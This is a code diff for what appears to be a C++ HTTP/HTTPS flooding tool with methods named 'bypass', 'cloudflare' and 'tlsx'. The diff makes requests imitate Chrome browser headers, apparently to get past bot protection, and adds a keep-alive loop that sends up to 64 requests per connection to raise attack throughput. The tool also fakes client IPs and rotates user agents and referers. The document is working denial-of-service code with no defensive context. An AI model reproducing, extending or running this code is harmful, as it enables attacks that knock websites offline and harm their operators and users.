@@ -308,16 +308,20 @@ static std::string build_http_request(const std::string &method, const std::stri
     std::string req = "GET " + req_path + " HTTP/1.1\r\n"
                       "Host: " + host + "\r\n"
                       "User-Agent: " + get_random_user_agent() + "\r\n"
-                      "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
-                      "Accept-Language: en-US,en;q=0.9\r\n"
+                      "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
+                      "Accept-Language: en-US,en;q=0.9,id;q=0.8\r\n"
                       "Accept-Encoding: gzip, deflate, br\r\n"
-                      "Referer: " + get_random_referer(host) + "\r\n"
-                      "Connection: keep-alive\r\n"
-                      "Upgrade-Insecure-Requests: 1\r\n"
+                      "Cache-Control: max-age=0\r\n"
+                      "Sec-Ch-Ua: \"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not-A.Brand\";v=\"99\"\r\n"
+                      "Sec-Ch-Ua-Mobile: ?0\r\n"
+                      "Sec-Ch-Ua-Platform: \"Linux\"\r\n"
                       "Sec-Fetch-Dest: document\r\n"
                       "Sec-Fetch-Mode: navigate\r\n"
-                      "Sec-Fetch-Site: cross-site\r\n"
-                      "Sec-Fetch-User: ?1\r\n";
+                      "Sec-Fetch-Site: none\r\n"
+                      "Sec-Fetch-User: ?1\r\n"
+                      "Upgrade-Insecure-Requests: 1\r\n"
+                      "Referer: " + get_random_referer(host) + "\r\n"
+                      "Connection: keep-alive\r\n";
 
     if (method == "bypass" || method == "cloudflare" || method == "tlsx") {
         std::string fake_ip = random_ip();
@@ -350,14 +354,22 @@ static void worker_http(const std::string &method, const std::string &host, cons
             continue;
         }
 
-        struct timeval tv{1, 0};
+        struct timeval tv{2, 0};
         setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
         setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 
         if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == 0) {
-            std::string req = build_http_request(method, host, path);
-            send(sock, req.c_str(), req.size(), MSG_NOSIGNAL);
-            g_total_packets.fetch_add(1, std::memory_order_relaxed);
+            // Keep-Alive connection reuse loop
+            for (int r = 0; r < 64 && g_running.load(std::memory_order_relaxed); ++r) {
+                std::string req = build_http_request(method, host, path);
+                ssize_t sent = send(sock, req.c_str(), req.size(), MSG_NOSIGNAL);
+                if (sent <= 0) break;
+                g_total_packets.fetch_add(1, std::memory_order_relaxed);
+
+                char drain[512];
+                recv(sock, drain, sizeof(drain), MSG_DONTWAIT);
+                std::this_thread::sleep_for(std::chrono::milliseconds(2));
+            }
         }
         close(sock);
     }
@@ -388,9 +400,16 @@ static void worker_https(const std::string &method, SSL_CTX *ctx, const std::str
                 SSL_set_tlsext_host_name(ssl, host.c_str());
 
                 if (SSL_connect(ssl) > 0) {
-                    std::string req = build_http_request(method, host, path);
-                    if (SSL_write(ssl, req.c_str(), (int)req.size()) > 0) {
+                    // Keep-Alive connection reuse loop
+                    for (int r = 0; r < 64 && g_running.load(std::memory_order_relaxed); ++r) {
+                        std::string req = build_http_request(method, host, path);
+                        int sent = SSL_write(ssl, req.c_str(), (int)req.size());
+                        if (sent <= 0) break;
                         g_total_packets.fetch_add(1, std::memory_order_relaxed);
+
+                        char drain[512];
+                        SSL_read(ssl, drain, sizeof(drain));
+                        std::this_thread::sleep_for(std::chrono::milliseconds(2));
                     }
                 }
                 SSL_shutdown(ssl);
